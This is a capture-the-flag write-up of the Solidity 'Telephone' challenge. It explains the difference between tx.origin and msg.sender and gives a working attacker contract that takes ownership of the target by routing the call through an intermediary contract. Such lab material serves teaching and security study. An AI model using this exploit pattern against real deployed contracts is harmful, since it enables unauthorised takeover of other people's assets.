## Telephone Challenge

### The goal of this challenge is to transfer ownership to your address

Solidity Code: 

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

Looking at the contract it's very easy to tell that satisfying the `tx.origin` being equivalent to `msg.sender` is where the this contract could be exploited!

But if you don't know the difference between the two let's explain it here in Lehman's terms: 

The `tx.origin` global variable refers to the original external account that started the transaction while `msg.sender` refers to the immediate account (it could be external or another contract account) that invokes the function.

- In simpler words `tx.origin` will be the originator of the transaction and `msg.sender` will be the caller of the function.

Now back to the contract we can tell that if we were to call the `changeOwner` function from another contract the `tx.origin` would not be equal to `msg.sender` and in that case the `msg.sender` will be the contract that calls this function while the transaction originator will be the address itself.

Let's implement that in code

```
contract HackTelephone {
    Telephone private immutable target;

    constructor(address _target) {
        target = Telephone(_target);
    }

    function changeOwner() external {
        target.changeOwner(msg.sender);
    }

}

```

And there you have it, Call the changeOwner function which and the if condition in the contract will be satisfied with the ownership transferred to your address.